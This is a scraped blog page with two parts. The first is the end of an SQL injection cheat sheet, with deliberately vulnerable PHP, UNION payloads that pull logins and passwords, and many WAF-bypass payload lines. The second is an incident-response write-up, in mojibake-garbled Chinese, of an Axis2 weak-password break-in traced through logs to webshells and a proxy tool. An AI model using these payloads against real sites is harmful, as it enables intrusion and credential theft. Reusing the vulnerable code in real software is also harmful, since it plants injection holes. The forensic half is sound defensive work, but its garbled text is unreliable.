<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$db_database</span> = <span class="string">&quot;finecms&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_database</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT uid,password FROM fn_member WHERE uid=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT username FROM fn_member WHERE password=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;font color=red&gt;This is the query which gives you Output : &lt;/font&gt;<span class="subst">$query</span>&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>(<span class="string">&quot;Invalid Input parameter&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Username is : &#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#Hex <span class="keyword">of</span>: <span class="number">-1</span><span class="string">&#x27; union select login,password from users-- a</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061</span> <span class="comment">-- a</span></span><br></pre></td></tr></table></figure>

<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="No-spaces-bypass"><a href="#No-spaces-bypass" class="headerlink" title="No spaces bypass"></a>No spaces bypass</h3><p>No Space (%20) - bypass using whitespace alternatives</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="keyword">and</span><span class="operator">%</span><span class="number">091</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Dand<span class="operator">%</span><span class="number">0</span>D1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>D<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Cand<span class="operator">%</span><span class="number">0</span>C1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>C<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Band<span class="operator">%</span><span class="number">0</span>B1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>B<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Aand<span class="operator">%</span><span class="number">0</span>A1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>A<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0and<span class="operator">%</span>A01<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using comments</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/*comment*/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using parenthesis</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span>(<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="No-commas-bypass"><a href="#No-commas-bypass" class="headerlink" title="No commas bypass"></a>No commas bypass</h3><p>No Comma - bypass using OFFSET, FROM and JOIN</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0</span><br><span class="line">SUBSTR(&#x27;SQL&#x27;,1,1) -&gt; SUBSTR(&#x27;SQL&#x27; FROM 1 FOR 1).</span><br><span class="line">SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d</span><br></pre></td></tr></table></figure>

<h3 id="Generic-Bypasses"><a href="#Generic-Bypasses" class="headerlink" title="Generic Bypasses"></a>Generic Bypasses</h3><p>Blacklist using keywords - bypass using uppercase&#x2F;lowercase</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AND   -&gt; &amp;&amp; -&gt; %26%26</span><br><span class="line">OR    -&gt; || -&gt; %7C%7C</span><br><span class="line">=     -&gt; LIKE,REGEXP,RLIKE, not &lt; and not &gt;</span><br><span class="line">&gt; X   -&gt; not between 0 and X</span><br><span class="line">WHERE -&gt; HAVING --&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span><br></pre></td></tr></table></figure>

<h3 id="Scientific-Notation-WAF-bypass"><a href="#Scientific-Notation-WAF-bypass" class="headerlink" title="Scientific Notation WAF bypass"></a>Scientific Notation WAF bypass</h3><p>You can find a more in depth explaination of this trick in <a target="_blank" rel="noopener" href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">gosecure blog</a>.<br>Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or 1.e(1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">-1&#x27; or 1337.1337e1 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; or 1.e(&#x27;&#x27;)=</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-Column-Names-Restrictionã€é™åˆ¶ã€‘"><a href="#Bypass-Column-Names-Restrictionã€é™åˆ¶ã€‘" class="headerlink" title="Bypass Column Names Restrictionã€é™åˆ¶ã€‘"></a>Bypass Column Names <strong>Restrictionã€é™åˆ¶ã€‘</strong></h3><p>First of all, notice that if the <strong>original query and the table where you want to extract the flag from have the same amount of columns</strong> you might just do: <code>0 UNION SELECT * FROM flag</code></p>
<p>Itâ€™s possible to <strong>access the third column of a table without using its name</strong> using a query like the following: <code>SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</code>, so in an sqlinjection this would looks like:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This is an example with 3 columns that will extract the column number 3</span></span><br><span class="line">-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</span><br></pre></td></tr></table></figure>

<p>Or using a <strong>comma bypass</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In this case, it&#x27;s extracting the third value from a 4 values table and returning 3 values in the &quot;union select&quot;</span></span><br><span class="line">-1 union select * from (select 1)a <span class="built_in">join</span> (select 2)b <span class="built_in">join</span> (select F.3 from (select * from (select 1)q <span class="built_in">join</span> (select 2)w <span class="built_in">join</span> (select 3)e <span class="built_in">join</span> (select 4)r union select * from flag <span class="built_in">limit</span> 1 offset 5)F)c</span><br></pre></td></tr></table></figure>

<p>This trick was taken from <a target="_blank" rel="noopener" href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/</a></p>
<h3 id="WAF-bypass-suggester-tools"><a href="#WAF-bypass-suggester-tools" class="headerlink" title="WAF bypass suggester tools"></a>WAF bypass suggester tools</h3><p>url&#x3D;â€<a target="_blank" rel="noopener" href="https://github.com/m4ll0k/Atlas">https://github.com/m4ll0k/Atlas</a></p>
<h2 id="Other-Guides"><a href="#Other-Guides" class="headerlink" title="Other Guides"></a>Other Guides</h2><ul>
<li><a target="_blank" rel="noopener" href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
<h2 id="Brute-Force-Detection-List"><a href="#Brute-Force-Detection-List" class="headerlink" title="Brute-Force Detection List"></a>Brute-Force Detection List</h2><p>url&#x3D;â€<a target="_blank" rel="noopener" href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;">https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/" class="post-title-link" itemprop="url">åº”æ€¥å“åº”ä¹‹axiså¼±å£ä»¤å…¥ä¾µ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-19 13:30:11 / Modified: 13:43:48" itemprop="dateCreated datePublished" datetime="2022-03-19T13:30:11+08:00">2022-03-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>5æœˆ14æ—¥æ™š20ç‚¹16åˆ†ï¼Œæ”¶åˆ°å®¢æˆ·é€šçŸ¥ï¼ŒæœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨æ¶æ„ä»£ç ã€‚è¡¨è±¡ä¸ºï¼šè¯¥æœåŠ¡å™¨ä»5æœˆ12æ—¥ä¸‹åˆ18ç‚¹å·¦å³å¼€å§‹å¯¹å…¶ä»–æœåŠ¡å™¨å‘èµ·æš´åŠ›ç ´è§£æ”»å‡»ï¼ŒåŒ…æ‹¬ SSHã€MSSQL æš´åŠ›ç ´è§£æ´»åŠ¨ã€‚</p>
<h2 id="0x02-äº‹ä»¶å¤„ç½®"><a href="#0x02-äº‹ä»¶å¤„ç½®" class="headerlink" title="0x02 äº‹ä»¶å¤„ç½®"></a>0x02 äº‹ä»¶å¤„ç½®</h2><h3 id="è®¿è°ˆç”¨æˆ·"><a href="#è®¿è°ˆç”¨æˆ·" class="headerlink" title="è®¿è°ˆç”¨æˆ·"></a>è®¿è°ˆç”¨æˆ·</h3><p><strong>è®¿è°ˆå†…å®¹ï¼š</strong></p>
<ol>
<li>å¼‚å¸¸æœåŠ¡å™¨åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPã€ç”¨é€”ã€ä¸­é—´ä»¶ã€æ“ä½œç³»ç»Ÿç­‰ï¼Ÿ</li>
<li>å‡ æ—¶å‡ºç°å¼‚å¸¸ç°åœºï¼Ÿ</li>
<li>å¼‚å¸¸æƒ…å†µæ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>é­å—å¼‚å¸¸æœåŠ¡å™¨æ”»å‡»çš„å—å®³è€…IPä¿¡æ¯ï¼Ÿ</li>
</ol>
<h3 id="ç½‘ç»œè¿æ¥åˆ†æ"><a href="#ç½‘ç»œè¿æ¥åˆ†æ" class="headerlink" title="ç½‘ç»œè¿æ¥åˆ†æ"></a>ç½‘ç»œè¿æ¥åˆ†æ</h3><p>æ ¹æ®ç”¨æˆ·æè¿°å¯çŸ¥ï¼Œå¼‚å¸¸æœåŠ¡å™¨å¯¹å—å®³è€…ä¸»æœºå‘èµ· SSHã€MSSQL æš´åŠ›ç ´è§£ï¼Œåœ¨å¼‚å¸¸ä¸»æœºè¾“å…¥å‘½ä»¤ï¼šnetstat -anplt | grep 1433ï¼Œå‘ç°å­˜åœ¨å¤šæ¡ç›®çš„ç«¯å£ä¸º 1433 çš„ç½‘ç»œè¿æ¥ä¿¡æ¯ï¼Œç›®çš„IPä¸å—å®³è€…IPä¿¡æ¯ä¸€è‡´ï¼Œç¨‹åº PID ä¸º 5033ï¼Œå¯¹åº”ç¨‹åºä¸º JAVA</p>
<h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>ps -aux | grep 5033 å¯¹åº”ä¸º WEB æœåŠ¡ï¼ŒçŒœæµ‹æ”»å‡»è€…é€šè¿‡ç±»ä¼¼reGeorg ç­‰å·¥å…·ä»£ç†æµé‡ï¼Œç„¶ååœ¨æœ¬åœ°å‘èµ·æš´åŠ›ç ´è§£æ”»å‡»ã€‚</p>
<h3 id="æ–‡ä»¶åˆ†æ"><a href="#æ–‡ä»¶åˆ†æ" class="headerlink" title="æ–‡ä»¶åˆ†æ"></a>æ–‡ä»¶åˆ†æ</h3><p><code>findÂ  webç›®å½•è·¯å¾„ -ctimeï¼ˆ-mtimeï¼‰ -7Â  -type f</code> ï¼ŒæŸ¥æ‰¾7æ—¥å†…æ–°å¢ã€æ”¹å˜çš„æ–‡ä»¶å¹¶è¿›è¡Œåˆ†æã€‚å‘ç°å¤šä¸ªæ–‡ä»¶ï¼Œæ¶‰åŠç±»å‹æœ‰ aar åŒ…ï¼Œå†°èæœ¨é©¬ï¼ŒreGeorg æµé‡ä»£ç†å·¥å…·ç­‰ã€‚</p>
<h3 id="WEBæ—¥å¿—åˆ†æ"><a href="#WEBæ—¥å¿—åˆ†æ" class="headerlink" title="WEBæ—¥å¿—åˆ†æ"></a>WEBæ—¥å¿—åˆ†æ</h3><h4 id="ç¡®è®¤æœ‰å“ªäº›æ¶æ„æ–‡ä»¶ï¼Ÿ"><a href="#ç¡®è®¤æœ‰å“ªäº›æ¶æ„æ–‡ä»¶ï¼Ÿ" class="headerlink" title="ç¡®è®¤æœ‰å“ªäº›æ¶æ„æ–‡ä»¶ï¼Ÿ"></a>ç¡®è®¤æœ‰å“ªäº›æ¶æ„æ–‡ä»¶ï¼Ÿ</h4><ol>
<li>é€šè¿‡findå‘½ä»¤æŸ¥æ‰¾7æ—¥ã€30æ—¥ä¹‹å†…å˜æ›´ã€æ–°å¢çš„æ–‡ä»¶ã€‚</li>
<li>é€šè¿‡æ²³é©¬ã€Dç›¾å¯¹æ•´ä¸ªwebç›®å½•è¿›è¡Œæ‰«æã€‚</li>
<li>å¯¹ç­›é€‰å‡ºæ¥çš„æ–‡ä»¶å†æ¬¡è¿›è¡Œäººå·¥å®¡æŸ¥ï¼Œåˆæ­¥ç¡®è®¤å­˜åœ¨3ä¸ªæ¶æ„æ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º skin.jspï¼ˆreGeorgï¼‰ã€help.jspï¼ˆreGeorgï¼‰ã€j2ee.jspï¼ˆå†°èï¼‰ã€‚</li>
</ol>
<h4 id="ç¡®è®¤æœ‰å¤šå°‘ä¸ªIPè®¿é—®è¿‡æ¶æ„æ–‡ä»¶ï¼Ÿ"><a href="#ç¡®è®¤æœ‰å¤šå°‘ä¸ªIPè®¿é—®è¿‡æ¶æ„æ–‡ä»¶ï¼Ÿ" class="headerlink" title="ç¡®è®¤æœ‰å¤šå°‘ä¸ªIPè®¿é—®è¿‡æ¶æ„æ–‡ä»¶ï¼Ÿ"></a>ç¡®è®¤æœ‰å¤šå°‘ä¸ªIPè®¿é—®è¿‡æ¶æ„æ–‡ä»¶ï¼Ÿ</h4><p><code>grep -ie &quot;skin.jsp\|help.jsp\|j2ee.jsp&quot; localhost_access_log* | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c</code> ï¼Œå‘ç°å…±15ä¸ªIPè®¿é—®è¿‡æ¶æ„æ–‡ä»¶ã€‚</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>112.96.67.7</td>
</tr>
<tr>
<td>2</td>
<td>13.234.116.183</td>
</tr>
<tr>
<td>3</td>
<td>58.62.206.235</td>
</tr>
<tr>
<td>4</td>
<td>58.62.206.249</td>
</tr>
<tr>
<td>5</td>
<td>112.96.195.23</td>
</tr>
<tr>
<td>6</td>
<td>120.235.159.163</td>
</tr>
<tr>
<td>7</td>
<td>120.239.76.89</td>
</tr>
<tr>
<td>8</td>
<td>223.104.66.68</td>
</tr>
<tr>
<td>9</td>
<td>112.96.193.140</td>
</tr>
<tr>
<td>10</td>
<td>120.235.159.189</td>
</tr>
<tr>
<td>11</td>
<td>120.235.159.246</td>
</tr>
<tr>
<td>12</td>
<td>223.104.63.106</td>
</tr>
<tr>
<td>13</td>
<td>45.66.134.61</td>
</tr>
<tr>
<td>14</td>
<td>112.96.173.19</td>
</tr>
<tr>
<td>15</td>
<td>117.136.41.37</td>
</tr>
</tbody></table>
<h4 id="ç¡®è®¤è¿™äº›IPä¸­ç¬¬ä¸€ä¸ªè®¿é—®ç³»ç»Ÿçš„IPæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ç¡®è®¤è¿™äº›IPä¸­ç¬¬ä¸€ä¸ªè®¿é—®ç³»ç»Ÿçš„IPæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç¡®è®¤è¿™äº›IPä¸­ç¬¬ä¸€ä¸ªè®¿é—®ç³»ç»Ÿçš„IPæ˜¯ä»€ä¹ˆï¼Ÿ"></a>ç¡®è®¤è¿™äº›IPä¸­ç¬¬ä¸€ä¸ªè®¿é—®ç³»ç»Ÿçš„IPæ˜¯ä»€ä¹ˆï¼Ÿ</h4><p><code>grep -m1Â  &quot;112.96.67.7/|13.234.116.183.....&quot;Â Â  localhost_access_log*</code>ï¼Œå‘ç°58.62.206.249ä¸ºç¬¬ä¸€ä¸ªè®¿é—®ç³»ç»Ÿçš„IPï¼Œè®¿é—®æ—¶é—´ä¸ºï¼š11&#x2F;May&#x2F;2021:12:15:23</p>
<h4 id="ç¡®è®¤è¿™äº›IPè®¿é—®è¿‡ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘é€è¿‡ä»€ä¹ˆè¯·æ±‚åŒ…ï¼Ÿ"><a href="#ç¡®è®¤è¿™äº›IPè®¿é—®è¿‡ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘é€è¿‡ä»€ä¹ˆè¯·æ±‚åŒ…ï¼Ÿ" class="headerlink" title="ç¡®è®¤è¿™äº›IPè®¿é—®è¿‡ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘é€è¿‡ä»€ä¹ˆè¯·æ±‚åŒ…ï¼Ÿ"></a>ç¡®è®¤è¿™äº›IPè®¿é—®è¿‡ä»€ä¹ˆæ–‡ä»¶ï¼Œå‘é€è¿‡ä»€ä¹ˆè¯·æ±‚åŒ…ï¼Ÿ</h4><ol>
<li><code>grep -ie &quot;IPåœ°å€.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; |awk -F &#39;?&#39; &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -rnk 1</code>Â ï¼ŒæŸ¥è¯¢æˆåŠŸè®¿é—®çš„urièµ„æºï¼Œå‘ç°å¯¹å«æœ‰AxisInvokerçš„è·¯å¾„è®¿é—®é¢‘ç¹; </li>
<li><code>grep -ie &quot;IPåœ°å€.*AxisInvoker.*\s200\s.*&quot; localhost_access_log* | awk &#39;&#123;print $7&#125;&#39; | sort | uniq -c | sort -rnk 1</code> ï¼Œæ’æŸ¥ AxisInvokerï¼Œæ£€æŸ¥æ–¹æ³•å‚æ•°ï¼Œåˆ†ææ”»å‡»è€…æ“ä½œï¼Œå‘ç°è¯¥æ–‡ä»¶å¯¹åº”7å¤©å†…æ–°å¢çš„ AxisInvoker.aar åŒ…ï¼Œæ˜¯åé—¨ç¨‹åºï¼Œæ”»å‡»è€…é€šè¿‡è¯¥åé—¨ç¨‹åºå†™å…¥skin.jspï¼ˆreGeorgï¼‰ã€help.jspï¼ˆreGeorgï¼‰ã€j2ee.jspï¼ˆå†°èï¼‰ï¼Œåå¼¹shellç­‰ã€‚</li>
</ol>
<h4 id="ç¡®è®¤ä»€ä¹ˆæ—¶å€™ç¬¬ä¸€æ¬¡è·å–æ§åˆ¶æƒï¼Ÿ"><a href="#ç¡®è®¤ä»€ä¹ˆæ—¶å€™ç¬¬ä¸€æ¬¡è·å–æ§åˆ¶æƒï¼Ÿ" class="headerlink" title="ç¡®è®¤ä»€ä¹ˆæ—¶å€™ç¬¬ä¸€æ¬¡è·å–æ§åˆ¶æƒï¼Ÿ"></a>ç¡®è®¤ä»€ä¹ˆæ—¶å€™ç¬¬ä¸€æ¬¡è·å–æ§åˆ¶æƒï¼Ÿ</h4><ol>
<li><code>grep -m1 -c10 -ie &quot;AxisInvoker&quot;Â  localhost_access_log*</code>ï¼Œå‘ç°ç¬¬ä¸€æ¬¡å‡ºç° AxisInvoker è®°å½•çš„ IPï¼š<code>58.62.206.249</code>ï¼Œå‡ºç°æ—¶é—´ï¼š<code>11/May/2021:13:39:08</code>ï¼Œå¯¹ä¸Šä¸€æ¡æ—¥å¿—è®°å½•ä¸º <code>/r1/axis2-admin/upload</code></li>
<li>æ£€æŸ¥ç¬¬ä¸€æ¬¡è®¿é—®ç³»ç»Ÿæ—¶é—´ï¼š<code>11/May/2021:12:15:23</code> ä¸ç¬¬ä¸€æ¬¡å‡ºç° AxisInvoker è®°å½•ï¼š<code>11/May/2021:13:39:08</code> ä¹‹é—´çš„æ—¥å¿—ï¼Œæœªå‘ç°å…¶ä»–å¼‚å¸¸çš„æƒ…å†µã€‚</li>
<li>ç»¼ä¸Šï¼Œåˆ¤æ–­æ”»å‡»è€…ç™»é™†äº† axis2 åå°ï¼Œå¹¶é€šè¿‡åå°éƒ¨ç½²AxisInvoker.aar åŒ…ï¼Œè·å–æ§åˆ¶æƒé™ï¼Œåˆæ¬¡è·å–æ§åˆ¶æƒé™çš„æ—¶é—´ä¸ºï¼š<code>11/May/2021:13:39:08</code>ã€‚</li>
</ol>
<h2 id="åˆ†æç»“æœ"><a href="#åˆ†æç»“æœ" class="headerlink" title="åˆ†æç»“æœ"></a>åˆ†æç»“æœ</h2><p>ç»åˆ†ææ•´ç†ï¼Œæœ¬æ¬¡ä¿¡æ¯å®‰å…¨äº‹ä»¶æ˜¯ç”± axis ç®¡ç†åå°å­˜åœ¨å¼±å£ä»¤æ¼æ´å¯¼è‡´ã€‚æ”»å‡»è€…é€šè¿‡ axis å¼±å£ä»¤ç™»å½•ç®¡ç†åå°ï¼Œåœ¨ç®¡ç†åå°éƒ¨ç½²æ¶æ„aaråŒ…è·å–æ§åˆ¶æƒé™ã€‚åç»­åˆ™é€šè¿‡ä¸Šä¼ å†°èæœ¨é©¬ï¼ŒreGeorg æµé‡ä»£ç†å·¥å…·ç­‰è¿›ä¸€æ­¥æ§åˆ¶æœåŠ¡å™¨å¹¶å¼€å±•æ¨ªå‘æ¸—é€æ”»å‡»ã€‚
Â </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-title-link" itemprop="url">è®°ä¸€æ¬¡æœåŠ¡å™¨åº”æ€¥å“åº”</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-19 13:05:01 / Modified: 13:24:01" itemprop="dateCreated datePublished" datetime="2022-03-19T13:05:01+08:00">2022-03-19</time>
